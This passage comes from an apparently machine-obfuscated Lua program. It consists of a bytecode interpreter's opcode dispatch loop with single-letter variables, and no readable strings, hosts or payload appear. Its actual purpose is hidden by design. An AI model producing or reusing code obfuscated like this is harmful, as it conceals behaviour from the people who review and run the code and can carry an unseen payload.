f;c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];f=a[2]h={c[f](c[f+1])};g=0;for a=f,a[4]do g=g+1;c[a]=h[g];end b=b+1;a=d[b];b=a[3];else local k;local m,l;local j;local g;g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]m,l=i(c[g](f(c,g+1,a[3])))h=l+g-1 k=0;for a=g,h do k=k+1;c[a]=m[k];end;end;elseif g<=98 then local b=a[2];local d=c[b];for a=b+1,a[3]do m(d,c[a])end;elseif g>99 then local g;local i;local h;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];h=a[2]c[h]=c[h](f(c,h+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];g=c[i]for a=i+1,a[4]do g=g..c[a];end;c[a[2]]=g;b=b+1;a=d[b];if(c[a[2]]~=c[a[4]])then b=b+1;else b=a[3];end;else local h;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))end;elseif g<=103 then if g<=101 then c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]();elseif g>102 then e[a[3]]=c[a[2]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];e[a[3]]=c[a[2]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=a[4];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=a[4];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=a[4];b=b+1;a=d[b];c[a[2]]=e[a[3]];else local b=a[2]local d,a=i(c[b](f(c,b+1,a[3])))h=a+b-1 local a=0;for b=b,h do a=a+1;c[b]=d[a];end;end;elseif g<=104 then local h;local g;c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=a[4];b=b+1;a=d[b];do return end;elseif g>105 then c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];else local g;local i;local h;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];h=a[2]c[h]=c[h](f(c,h+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];g=c[i]for a=i+1,a[4]do g=g..c[a];end;c[a[2]]=g;b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;end;elseif g<=117 then if g<=111 then if g<=108 then if g==107 then local j;local k;local m,l;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]m,l=i(c[g](f(c,g+1,a[3])))h=l+g-1 k=0;for a=g,h do k=k+1;c[a]=m[k];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];g=a[2];j=c[a[3]];c[g+1]=j;c[g]=j[a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))else local b=a[2];local d=c[a[3]];c[b+1]=d;c[b]=d[c[a[4]]];end;elseif g<=109 then local j;local l,k;local g;c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]l,k=i(c[g](f(c,g+1,a[3])))h=k+g-1 j=0;for a=g,h do j=j+1;c[a]=l[j];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]l,k=i(c[g](f(c,g+1,a[3])))h=k+g-1 j=0;for a=g,h do j=j+1;c[a]=l[j];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];elseif g==110 then local g;g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];else c[a[2]]=c[a[3]][c[a[4]]];end;elseif g<=114 then if g<=112 then local h;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))elseif g>113 then c[a[2]]();b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];e[a[3]]=c[a[2]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];else local a=a[2]local d,b=i(c[a](c[a+1]))h=b+a-1 local b=0;for a=a,h do b=b+1;c[a]=d[b];end;end;elseif g<=115 then local g;local i;local h;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];h=a[2]c[h]=c[h](f(c,h+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];g=c[i]for a=i+1,a[4]do g=g..c[a];end;c[a[2]]=g;b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;elseif g>116 then c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];else local g;local e;c[a[2]]=a[3];b=b+1;a=d[b];e=a[2];g=c[a[3]];c[e+1]=g;c[e]=g[c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];e=a[2]c[e]=c[e](f(c,e+1,a[3]))b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];e=a[2];g=c[a[3]];c[e+1]=g;c[e]=g[c[a[4]]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];e=a[2]c[e]=c[e](f(c,e+1,a[3]))b=b+1;a=d[b];e=a[2];g=c[a[3]];c[e+1]=g;c[e]=g[a[4]];end;elseif g<=122 then if g<=119 then if g==118 then c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];else local h;local g;c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];h=c[a[3]];c[g+1]=h;c[g]=h[a[4]];end;elseif g<=120 then c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];elseif g==121 then b=a[3];else c[a[2]]();b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];end;elseif g<=125 then if g<=123 then local g;local e;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];e=a[2];g=c[a[3]];c[e+1]=g;c[e]=g[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];e=a[2]c[e](f(c,e+1,a[3]))elseif g>124 then c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]][a[3]]=c[a[4]];else local b=a[2]local d,a=i(c[b](f(c,b+1,a[3])))h=a+b-1 local a=0;for b=b,h do a=a+1;c[b]=d[a];end;end;elseif g<=126 then local d=a[2]local e={c[d](f(c,d+1,a[3]))};local b=0;for a=d,a[4]do b=b+1;c[a]=e[b];end elseif g==127 then local j;local l,k;local m;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2];m=c[a[3]];c[g+1]=m;c[g]=m[a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];g=a[2]c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g](c[g+1])b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]l,k=i(c[g](f(c,g+1,a[3])))h=k+g-1 j=0;for a=g,h do j=j+1;c[a]=l[j];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=c[a[3]][c[a[4]]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]={};b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]l,k=i(c[g](f(c,g+1,a[3])))h=k+g-1 j=0;for a=g,h do j=j+1;c[a]=l[j];end;b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,h))b=b+1;a=d[b];c[a[2]][c[a[3]]]=c[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];else c[a[2]]=n(o[a[3]],nil,e);end;elseif g<=149 then if g<=138 then if g<=133 then if g<=130 then if g==129 then c[a[2]]=c[a[3]]-c[a[4]];else local g;local i;local h;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];h=a[2]c[h]=c[h](f(c,h+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];g=c[i]for a=i+1,a[4]do g=g..c[a];end;c[a[2]]=g;b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;end;elseif g<=131 then local g;local j;local l,m;local k;local g;c[a[2]]=e[a[3]];b=b+1;a=d[b];g=a[2];k=c[a[3]];c[g+1]=k;c[g]=k[a[4]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];g=a[2];k=c[a[3]];c[g+1]=k;c[g]=k[a[4]];b=b+1;a=d[b];g=a[2]l,m=i(c[g](c[g+1]))h=m+g-1 j=0;for a=g,h do j=j+1;c[a]=l[j];end;b=b+1;a=d[b];g=a[2]l={c[g](f(c,g+1,h))};j=0;for a=g,a[4]do j=j+1;c[a]=l[j];end b=b+1;a=d[b];b=a[3];elseif g==132 then local g;local i;local h;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];h=a[2]c[h]=c[h](f(c,h+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];g=c[i]for a=i+1,a[4]do g=g..c[a];end;c[a[2]]=g;b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;else local g;local f;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];f=a[2];g=c[a[3]];c[f+1]=g;c[f]=g[a[4]];b=b+1;a=d[b];f=a[2]c[f](c[f+1])b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]][a[4]];end;elseif g<=135 then if g>134 then local h;local i;local g;c[a[2]]=c[a[3]][a[4]];b=b+1;a=d[b];c[a[2]]=c[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];g=a[2]c[g]=c[g](f(c,g+1,a[3]))b=b+1;a=d[b];c[a[2]]=e[a[3]];b=b+1;a=d[b];c[a[2]]=a[3];b=b+1;a=d[b];i=a[3];h=c[i]for a=i+1,a[4]do h=h..c[a];end;c[a[2]]=h;b=b+1;a=d[b];if(c[a[2]]==c[a[4]])then b=b+1;else b=a[3];end;else local h;local 